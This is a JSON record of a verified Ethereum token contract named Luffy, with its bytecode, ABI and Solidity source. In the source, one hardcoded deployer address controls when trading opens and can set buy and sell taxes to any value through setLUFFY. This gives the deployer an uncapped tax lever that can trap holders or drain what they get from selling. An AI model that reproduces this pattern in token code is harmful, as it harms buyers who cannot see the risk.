{
    "address": "0xd393472AFA2cB902D5E3762Fb3cfaDd2DCA946E6",
    "tx_hash": "30b6c51824ba43d57cf137a7ddde3269d9262363d602724fea57433a7649ae11",
    "block_number": 18006876,
    "timestamp": 1693149899,
    "gas_used_in_creation": 3316005,
    "creation_bytecode": "60a060405260028080556003556004805460ff191690553480156200002357600080fd5b50737a250d5630b4cf539739df2c5dacb4c659f2488d6001600160a01b031663c45a01556040518163ffffffff1660e01b8152600401602060405180830381865afa15801562000077573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906200009d9190620001e4565b6040516364e329cb60e11b815230600482015273c02aaa39b223fe8d0a0e5c4f27ead9083c756cc260248201526001600160a01b03919091169063c9c65396906044016020604051808303816000875af115801562000100573d6000803e3d6000fd5b505050506040513d601f19601f82011682018060405250810190620001269190620001e4565b6001600160a01b0316608052620001406009600a6200032b565b6200014f90620f42406200033c565b336000818152602081815260408083209490945530825260018152838220737a250d5630b4cf539739df2c5dacb4c659f2488d835290529182206000199055907fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef620001be6009600a6200032b565b620001cd90620f42406200033c565b60405190815260200160405180910390a362000356565b600060208284031215620001f757600080fd5b81516001600160a01b03811681146200020f57600080fd5b9392505050565b634e487b7160e01b600052601160045260246000fd5b600181815b808511156200026d57816000190482111562000251576200025162000216565b808516156200025f57918102915b93841c939080029062000231565b509250929050565b600082620002865750600162000325565b81620002955750600062000325565b8160018114620002ae5760028114620002b957620002d9565b600191505062000325565b60ff841115620002cd57620002cd62000216565b50506001821b62000325565b5060208310610133831016604e8410600b8410161715620002fe575081810a62000325565b6200030a83836200022c565b806000190482111562000321576200032162000216565b0290505b92915050565b60006200020f60ff84168362000275565b808202811582820484141762000325576200032562000216565b608051610c0c6200038060003960008181610439015281816104fc01526107530152610c0c6000f3fe6080604052600436106100a05760003560e01c80636345a773116100645780636345a7731461018d57806370a08231146101af57806395d89b41146101dc578063a9059cbb1461020d578063c9567bf91461022d578063dd62ed3e1461024257600080fd5b806306fdde03146100ac578063095ea7b3146100f357806318160ddd1461012357806323b872dd14610146578063313ce5671461016657600080fd5b366100a757005b600080fd5b3480156100b857600080fd5b506100dd604051806040016040528060058152602001644c7566667960d81b81525081565b6040516100ea91906108a7565b60405180910390f35b3480156100ff57600080fd5b5061011361010e366004610911565b61027a565b60405190151581526020016100ea565b34801561012f57600080fd5b506101386102e7565b6040519081526020016100ea565b34801561015257600080fd5b5061011361016136600461093b565b610303565b34801561017257600080fd5b5061017b600981565b60405160ff90911681526020016100ea565b34801561019957600080fd5b506101ad6101a8366004610977565b610351565b005b3480156101bb57600080fd5b506101386101ca366004610999565b60006020819052908152604090205481565b3480156101e857600080fd5b506100dd604051806040016040528060058152602001644c5546465960d81b81525081565b34801561021957600080fd5b50610113610228366004610911565b610392565b34801561023957600080fd5b506101ad6103a6565b34801561024e57600080fd5b5061013861025d3660046109b4565b600160209081526000928352604080842090915290825290205481565b3360008181526001602090815260408083206001600160a01b038716808552925280832085905551919290917f8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925906102d59086815260200190565b60405180910390a35060015b92915050565b6102f36009600a610ae1565b61030090620f4240610af0565b81565b6001600160a01b0383166000908152600160209081526040808320338452909152812080548391908390610338908490610b07565b9091555061034990508484846103d5565b949350505050565b734a7b2fac15d6b61c12000577e475f7086254ccdc19330161037857600291909155600355565b600a821061038557600080fd5b600a81106100a757600080fd5b600061039f3384846103d5565b9392505050565b33734a7b2fac15d6b61c12000577e475f7086254ccdd146103c657600080fd5b6004805460ff19166001179055565b6001600160a01b0383166000908152602081905260408120805483919083906103ff908490610b07565b90915550506001600160a01b038416734a7b2fac15d6b61c12000577e475f7086254ccdd146104375760045460ff1661043757600080fd5b7f00000000000000000000000000000000000000000000000000000000000000006001600160a01b0316836001600160a01b03161415801561049657506001600160a01b038316734a7b2fac15d6b61c12000577e475f7086254ccdd14155b156104fa5760646104a96009600a610ae1565b6104b690620f4240610af0565b6104c1906064610af0565b6104cb9190610b1a565b6001600160a01b0384166000908152602081905260409020546104ef908490610b3c565b11156104fa57600080fd5b7f00000000000000000000000000000000000000000000000000000000000000006001600160a01b0316836001600160a01b03161480156105435750600454610100900460ff16155b801561058357506103e86105596009600a610ae1565b61056690620f4240610af0565b6105709190610b1a565b3060009081526020819052604090205410155b15610712576004805461ff00191661010017905560408051600280825260608201835260009260208301908036833701905050905030816000815181106105cc576105cc610b4f565b60200260200101906001600160a01b031690816001600160a01b03168152505073c02aaa39b223fe8d0a0e5c4f27ead9083c756cc28160018151811061061457610614610b4f565b6001600160a01b0390921660209283029190910190910152737a250d5630b4cf539739df2c5dacb4c659f2488d63791ac9476103e86106556009600a610ae1565b61066290620f4240610af0565b61066c9190610b1a565b60008430426040518663ffffffff1660e01b8152600401610691959493929190610b65565b600060405180830381600087803b1580156106ab57600080fd5b505af11580156106bf573d6000803e3d6000fd5b5050604051734a7b2fac15d6b61c12000577e475f7086254ccdd92504780156108fc029250906000818181858888f19350505050158015610704573d6000803e3d6000fd5b50506004805461ff00191690555b6001600160a01b038416301480159061074857506001600160a01b038316734a7b2fac15d6b61c12000577e475f7086254ccdd14155b1561082157600060647f00000000000000000000000000000000000000000000000000000000000000006001600160a01b0316866001600160a01b03161461079257600354610796565b6002545b6107a09085610af0565b6107aa9190610b1a565b90506107b68184610b07565b306000908152602081905260408120805492955083929091906107da908490610b3c565b909155505060405181815230906001600160a01b038716907fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef9060200160405180910390a3505b6001600160a01b03831660009081526020819052604081208054849290610849908490610b3c565b92505081905550826001600160a01b0316846001600160a01b03167fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef8460405161089591815260200190565b60405180910390a35060019392505050565b600060208083528351808285015260005b818110156108d4578581018301518582016040015282016108b8565b506000604082860101526040601f19601f8301168501019250505092915050565b80356001600160a01b038116811461090c57600080fd5b919050565b6000806040838503121561092457600080fd5b61092d836108f5565b946020939093013593505050565b60008060006060848603121561095057600080fd5b610959846108f5565b9250610967602085016108f5565b9150604084013590509250925092565b6000806040838503121561098a57600080fd5b50508035926020909101359150565b6000602082840312156109ab57600080fd5b61039f826108f5565b600080604083850312156109c757600080fd5b6109d0836108f5565b91506109de602084016108f5565b90509250929050565b634e487b7160e01b600052601160045260246000fd5b600181815b80851115610a38578160001904821115610a1e57610a1e6109e7565b80851615610a2b57918102915b93841c9390800290610a02565b509250929050565b600082610a4f575060016102e1565b81610a5c575060006102e1565b8160018114610a725760028114610a7c57610a98565b60019150506102e1565b60ff841115610a8d57610a8d6109e7565b50506001821b6102e1565b5060208310610133831016604e8410600b8410161715610abb575081810a6102e1565b610ac583836109fd565b8060001904821115610ad957610ad96109e7565b029392505050565b600061039f60ff841683610a40565b80820281158282048414176102e1576102e16109e7565b818103818111156102e1576102e16109e7565b600082610b3757634e487b7160e01b600052601260045260246000fd5b500490565b808201808211156102e1576102e16109e7565b634e487b7160e01b600052603260045260246000fd5b600060a082018783526020878185015260a0604085015281875180845260c086019150828901935060005b81811015610bb55784516001600160a01b031683529383019391830191600101610b90565b50506001600160a01b0396909616606085015250505060800152939250505056fea264697066735822122061545bbdba40c3fd9b778b6efb39f4d54d7e3a2a4cad1b42a9e44b16ab4f08c564736f6c63430008120033",
    "runtime_bytecode": "6080604052600436106100a05760003560e01c80636345a773116100645780636345a7731461018d57806370a08231146101af57806395d89b41146101dc578063a9059cbb1461020d578063c9567bf91461022d578063dd62ed3e1461024257600080fd5b806306fdde03146100ac578063095ea7b3146100f357806318160ddd1461012357806323b872dd14610146578063313ce5671461016657600080fd5b366100a757005b600080fd5b3480156100b857600080fd5b506100dd604051806040016040528060058152602001644c7566667960d81b81525081565b6040516100ea91906108a7565b60405180910390f35b3480156100ff57600080fd5b5061011361010e366004610911565b61027a565b60405190151581526020016100ea565b34801561012f57600080fd5b506101386102e7565b6040519081526020016100ea565b34801561015257600080fd5b5061011361016136600461093b565b610303565b34801561017257600080fd5b5061017b600981565b60405160ff90911681526020016100ea565b34801561019957600080fd5b506101ad6101a8366004610977565b610351565b005b3480156101bb57600080fd5b506101386101ca366004610999565b60006020819052908152604090205481565b3480156101e857600080fd5b506100dd604051806040016040528060058152602001644c5546465960d81b81525081565b34801561021957600080fd5b50610113610228366004610911565b610392565b34801561023957600080fd5b506101ad6103a6565b34801561024e57600080fd5b5061013861025d3660046109b4565b600160209081526000928352604080842090915290825290205481565b3360008181526001602090815260408083206001600160a01b038716808552925280832085905551919290917f8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925906102d59086815260200190565b60405180910390a35060015b92915050565b6102f36009600a610ae1565b61030090620f4240610af0565b81565b6001600160a01b0383166000908152600160209081526040808320338452909152812080548391908390610338908490610b07565b9091555061034990508484846103d5565b949350505050565b734a7b2fac15d6b61c12000577e475f7086254ccdc19330161037857600291909155600355565b600a821061038557600080fd5b600a81106100a757600080fd5b600061039f3384846103d5565b9392505050565b33734a7b2fac15d6b61c12000577e475f7086254ccdd146103c657600080fd5b6004805460ff19166001179055565b6001600160a01b0383166000908152602081905260408120805483919083906103ff908490610b07565b90915550506001600160a01b038416734a7b2fac15d6b61c12000577e475f7086254ccdd146104375760045460ff1661043757600080fd5b7f0000000000000000000000004edb04ff7687403edc2627a28f9b78c8120c1b216001600160a01b0316836001600160a01b03161415801561049657506001600160a01b038316734a7b2fac15d6b61c12000577e475f7086254ccdd14155b156104fa5760646104a96009600a610ae1565b6104b690620f4240610af0565b6104c1906064610af0565b6104cb9190610b1a565b6001600160a01b0384166000908152602081905260409020546104ef908490610b3c565b11156104fa57600080fd5b7f0000000000000000000000004edb04ff7687403edc2627a28f9b78c8120c1b216001600160a01b0316836001600160a01b03161480156105435750600454610100900460ff16155b801561058357506103e86105596009600a610ae1565b61056690620f4240610af0565b6105709190610b1a565b3060009081526020819052604090205410155b15610712576004805461ff00191661010017905560408051600280825260608201835260009260208301908036833701905050905030816000815181106105cc576105cc610b4f565b60200260200101906001600160a01b031690816001600160a01b03168152505073c02aaa39b223fe8d0a0e5c4f27ead9083c756cc28160018151811061061457610614610b4f565b6001600160a01b0390921660209283029190910190910152737a250d5630b4cf539739df2c5dacb4c659f2488d63791ac9476103e86106556009600a610ae1565b61066290620f4240610af0565b61066c9190610b1a565b60008430426040518663ffffffff1660e01b8152600401610691959493929190610b65565b600060405180830381600087803b1580156106ab57600080fd5b505af11580156106bf573d6000803e3d6000fd5b5050604051734a7b2fac15d6b61c12000577e475f7086254ccdd92504780156108fc029250906000818181858888f19350505050158015610704573d6000803e3d6000fd5b50506004805461ff00191690555b6001600160a01b038416301480159061074857506001600160a01b038316734a7b2fac15d6b61c12000577e475f7086254ccdd14155b1561082157600060647f0000000000000000000000004edb04ff7687403edc2627a28f9b78c8120c1b216001600160a01b0316866001600160a01b03161461079257600354610796565b6002545b6107a09085610af0565b6107aa9190610b1a565b90506107b68184610b07565b306000908152602081905260408120805492955083929091906107da908490610b3c565b909155505060405181815230906001600160a01b038716907fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef9060200160405180910390a3505b6001600160a01b03831660009081526020819052604081208054849290610849908490610b3c565b92505081905550826001600160a01b0316846001600160a01b03167fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef8460405161089591815260200190565b60405180910390a35060019392505050565b600060208083528351808285015260005b818110156108d4578581018301518582016040015282016108b8565b506000604082860101526040601f19601f8301168501019250505092915050565b80356001600160a01b038116811461090c57600080fd5b919050565b6000806040838503121561092457600080fd5b61092d836108f5565b946020939093013593505050565b60008060006060848603121561095057600080fd5b610959846108f5565b9250610967602085016108f5565b9150604084013590509250925092565b6000806040838503121561098a57600080fd5b50508035926020909101359150565b6000602082840312156109ab57600080fd5b61039f826108f5565b600080604083850312156109c757600080fd5b6109d0836108f5565b91506109de602084016108f5565b90509250929050565b634e487b7160e01b600052601160045260246000fd5b600181815b80851115610a38578160001904821115610a1e57610a1e6109e7565b80851615610a2b57918102915b93841c9390800290610a02565b509250929050565b600082610a4f575060016102e1565b81610a5c575060006102e1565b8160018114610a725760028114610a7c57610a98565b60019150506102e1565b60ff841115610a8d57610a8d6109e7565b50506001821b6102e1565b5060208310610133831016604e8410600b8410161715610abb575081810a6102e1565b610ac583836109fd565b8060001904821115610ad957610ad96109e7565b029392505050565b600061039f60ff841683610a40565b80820281158282048414176102e1576102e16109e7565b818103818111156102e1576102e16109e7565b600082610b3757634e487b7160e01b600052601260045260246000fd5b500490565b808201808211156102e1576102e16109e7565b634e487b7160e01b600052603260045260246000fd5b600060a082018783526020878185015260a0604085015281875180845260c086019150828901935060005b81811015610bb55784516001600160a01b031683529383019391830191600101610b90565b50506001600160a01b0396909616606085015250505060800152939250505056fea264697066735822122061545bbdba40c3fd9b778b6efb39f4d54d7e3a2a4cad1b42a9e44b16ab4f08c564736f6c63430008120033",
    "contract_name": "Luffy",
    "compiler_version": "v0.8.18+commit.87f61d96",
    "optimization_used": "1",
    "runs": "200",
    "abi": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"openTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"newBuyTax\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"newSellTax\",\"type\":\"uint256\"}],\"name\":\"setLUFFY\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}]",
    "source_code": "/**\r\n\r\nLuffy is the world's first anime token.\r\n\r\nLuffy offers a complete package for crypto and Anime enthusiasts.\r\n\r\nTELEGRAM - https://t.me/LuffyTGPortal\r\nTWITTER - https://twitter.com/LuffyERC20\r\nWEBSITE - https://luffytoken.xyz\r\n\r\n*/\r\n\r\n// SPDX-License-Identifier: unlicense\r\n\r\npragma solidity =0.8.18;\r\n\r\ninterface IUniswapV2Factory {\r\n    function createPair(address tokenA, address tokenB)\r\n        external\r\n        returns (address pair);\r\n\r\n}\r\ninterface IUniswapV2Router02 {\r\n    function factory() external pure returns (address);\r\n    function swapExactTokensForETHSupportingFeeOnTransferTokens(\r\n        uint amountIn,\r\n        uint amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint deadline\r\n    ) external;\r\n}\r\n \r\ncontract Luffy {\r\n    mapping (address => uint256) public balanceOf;\r\n    mapping (address => mapping (address => uint256)) public allowance;\r\n\r\n    string public constant name = \"Luffy\";   \r\n    string public constant symbol = \"LUFFY\";   \r\n    uint8 public constant decimals = 9;\r\n    uint256 public constant totalSupply = 1_000_000 * 10**decimals;\r\n\r\n    uint256 buyTax = 2;\r\n    uint256 sellTax = 2;\r\n    uint256 constant swapAmount = totalSupply / 1000;\r\n    uint256 constant maxWallet = 100 * totalSupply / 100;\r\n\r\n    bool tradingOpened = false;\r\n    bool swapping;\r\n\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval(\r\n        address indexed owner,\r\n        address indexed spender,\r\n        uint256 value\r\n    );\r\n\r\n    address immutable pair;\r\n    address constant ETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;\r\n    address constant routerAddress = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;\r\n    IUniswapV2Router02 constant _uniswapV2Router = IUniswapV2Router02(routerAddress);\r\n    address payable constant deployer = payable(address(0x4A7B2Fac15D6B61c12000577e475f7086254ccdd));\r\n\r\n    constructor() {\r\n        pair = IUniswapV2Factory(_uniswapV2Router.factory())\r\n            .createPair(address(this), ETH);\r\n        balanceOf[msg.sender] = totalSupply;\r\n        allowance[address(this)][routerAddress] = type(uint256).max;\r\n        emit Transfer(address(0), msg.sender, totalSupply);\r\n    }\r\n\r\n    receive() external payable {}\r\n\r\n    function approve(address spender, uint256 amount) external returns (bool){\r\n        allowance[msg.sender][spender] = amount;\r\n        emit Approval(msg.sender, spender, amount);\r\n        return true;\r\n    }\r\n\r\n    function transfer(address to, uint256 amount) external returns (bool){\r\n        return _transfer(msg.sender, to, amount);\r\n    }\r\n\r\n    function transferFrom(address from, address to, uint256 amount) external returns (bool){\r\n        allowance[from][msg.sender] -= amount;        \r\n        return _transfer(from, to, amount);\r\n    }\r\n\r\n    function _transfer(address from, address to, uint256 amount) internal returns (bool){\r\n        balanceOf[from] -= amount;\r\n\r\n        if(from != deployer)\r\n            require(tradingOpened);\r\n\r\n        if(to != pair && to != deployer)\r\n            require(balanceOf[to] + amount <= maxWallet);\r\n\r\n        if (to == pair && !swapping && balanceOf[address(this)] >= swapAmount){\r\n            swapping = true;\r\n            address[] memory path = new  address[](2);\r\n            path[0] = address(this);\r\n            path[1] = ETH;\r\n            _uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(\r\n                swapAmount,\r\n                0,\r\n                path,\r\n                address(this),\r\n                block.timestamp\r\n            );\r\n            deployer.transfer(address(this).balance);\r\n            swapping = false;\r\n        }\r\n\r\n        if(from != address(this) && to != deployer){\r\n            uint256 taxAmount = amount * (from == pair ? buyTax : sellTax) / 100;\r\n            amount -= taxAmount;\r\n            balanceOf[address(this)] += taxAmount;\r\n            emit Transfer(from, address(this), taxAmount);\r\n        }\r\n        balanceOf[to] += amount;\r\n        emit Transfer(from, to, amount);\r\n        return true;\r\n    }\r\n\r\n    function openTrading() external {\r\n        require(msg.sender == deployer);\r\n        tradingOpened = true;\r\n    }\r\n\r\n    function setLUFFY(uint256 newBuyTax, uint256 newSellTax) external {\r\n        if(msg.sender == deployer){\r\n            buyTax = newBuyTax;\r\n            sellTax = newSellTax;\r\n        }\r\n        else{\r\n            require(newBuyTax < 10);\r\n            require(newSellTax < 10);\r\n            revert();\r\n        }\r\n        \r\n    }\r\n}",
    "etherscan_verified": true
}